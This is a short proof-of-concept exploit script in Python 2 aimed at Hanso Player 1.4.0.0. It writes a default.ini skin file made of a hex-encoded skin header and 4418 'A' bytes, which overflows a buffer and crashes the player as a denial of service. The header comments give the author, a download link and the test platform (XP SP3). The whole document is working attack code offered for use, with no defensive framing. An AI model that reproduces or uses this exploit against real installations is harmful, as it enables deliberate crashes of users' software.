# Exploit Title: Hanso Player 1.4.0.0 Buffer Overflow - DoS Skinfile 
# Date: 05.02.2011 
# Author: Dame Jovanoski(badc0re) 
# Software Link: http://www.hansotools.com/downloads/hanso-player-setup.exe 
# Version: 1.4.0.0 
# Tested on: XP sp3 

from struct import * 
import time 

f=open("default.ini","w") 
print "Creating expoit." 
time.sleep(1) 
print "Creating explot.." 
time.sleep(1) 
print "Creating explot..." 
junk="\x41"*4418 

head=("\x5B\x48\x61\x6E\x73\x6F\x20\x50" 
		"\x6C\x61\x79\x65\x72\x20\x53\x6B" 
		"\x69\x6E\x5D\x0A") 
try: 
	f.write(head+junk) 
	f.close() 
	print "File created" 
except: 
	print "File cannot be created"